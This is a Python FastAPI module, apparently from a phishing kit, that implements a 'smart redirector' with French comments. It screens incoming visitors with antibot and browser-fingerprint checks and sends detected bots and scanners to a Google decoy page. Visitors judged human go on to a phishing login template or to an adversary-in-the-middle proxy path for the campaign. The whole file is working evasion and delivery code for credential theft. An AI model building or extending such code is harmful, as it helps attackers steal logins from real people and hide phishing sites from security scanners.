from typing import Dict, Optional, Any
from fastapi import Request, HTTPException, status
from fastapi.responses import RedirectResponse, HTMLResponse
from core.redirect.antibot import antibot
from core.redirect.fingerprint import fp_validator, BrowserFingerprint
from core.session.session_manager import session_manager
from core.cache.redis_manager import redis_cache
import os

class SmartRedirector:
    """
    Moteur de Redirection Intelligent (Tier 2 Logic)
    Gère le filtrage du trafic et la redirection dynamique vers le Core ou le Blackhole.
    """
    
    DECOY_URL = "https://www.google.com/search?q=security+scan"
    
    def __init__(self, use_antibot: bool = True):
        self.use_antibot = use_antibot
        self.antibot = antibot
        self.fp_validator = fp_validator
        self.session_manager = session_manager
        self.template_path = "core/web/templates/redirect.html"
        self.js_path = "core/assets/js/fingerprint_collector.js"
    
    async def process_request(self, request: Request, target_campaign_id: str):
        """
        Traite la requête entrante, vérifie les bots, et sert la page de loading/fingerprinting.
        """
        # Support Tiered Infrastructure (X-Forwarded-For)
        forwarded_for = request.headers.get("x-forwarded-for")
        if forwarded_for:
            client_ip = forwarded_for.split(",")[0].strip()
        else:
            client_ip = request.client.host
            
        user_agent = request.headers.get("user-agent", "")
        
        # 1. Vérification Anti-Bot (Basic IP/UA)
        if self.use_antibot:
            check_result = await self.antibot.check_request(request)
            
            if check_result["blocked"]:
                print(f"[ANTIBOT] Bloqué: {check_result['reason']} (IP: {client_ip})")
                return RedirectResponse(url=self.DECOY_URL, status_code=status.HTTP_302_FOUND)
        
        # 2. Création de Session (Valid Visitor)
        session_id = self.session_manager.create_session(
            campaign_id=target_campaign_id,
            client_ip=client_ip,
            user_agent=user_agent
        )
        
        # 3. Servir la page de redirection (Fingerprinting)
        try:
            with open(self.template_path, "r") as f:
                content = f.read()
            
            # Injection du JS de fingerprinting (si disponible)
            try:
                with open(self.js_path, "r") as f:
                    js_content = f.read()
            except FileNotFoundError:
                js_content = "// Fingerprint collector not found"
                print(f"[SmartRedirect Warning] JS {self.js_path} not found.")

            # Injection des IDs et du JS
            content = content.replace("{{ campaign_id }}", target_campaign_id)
            content = content.replace("{{ session_id }}", session_id)
            content = content.replace("/* {{ fingerprint_js }} */", js_content)
            
            return HTMLResponse(content=content, status_code=200)
        except FileNotFoundError:
            # Fallback si template manquant
            print(f"[SmartRedirect Warning] Template {self.template_path} not found.")
            return self._get_final_destination(target_campaign_id, session_id)

    async def verify_fingerprint(self, session_id: str, fingerprint_data: Dict[str, Any], campaign_id: str):
        """
        Valide le fingerprint reçu et retourne la destination finale.
        """
        try:
            # Validation structurelle et logique
            fp = BrowserFingerprint(**fingerprint_data)
            is_human = self.fp_validator.validate(fp)
            
            if not is_human:
                print(f"[ANTIBOT] Fingerprint rejected for session {session_id}")
                return {"redirect_to": self.DECOY_URL}
                
            # Validation réussie -> Destination finale
            return self._get_final_destination(campaign_id, session_id)
            
        except Exception as e:
            print(f"[SmartRedirect Error] Fingerprint validation failed: {e}")
            return {"redirect_to": self.DECOY_URL}

    def _get_final_destination(self, campaign_id: str, session_id: str):
        """Détermine l'URL finale (AiTM ou Template)"""
        campaign = redis_cache.get(f"campaign:{campaign_id}")
        redirect_to = f"/v5/phish/{campaign_id}/login?sid={session_id}" # Default to template
        
        if campaign and campaign.get("type") == "aitm":
            # AiTM Mode: Redirection vers le proxy avec le session_id
            redirect_to = f"/v5/p/{session_id}/"
            
        return {"redirect_to": redirect_to}

# Instance globale
smart_redirector = SmartRedirector()
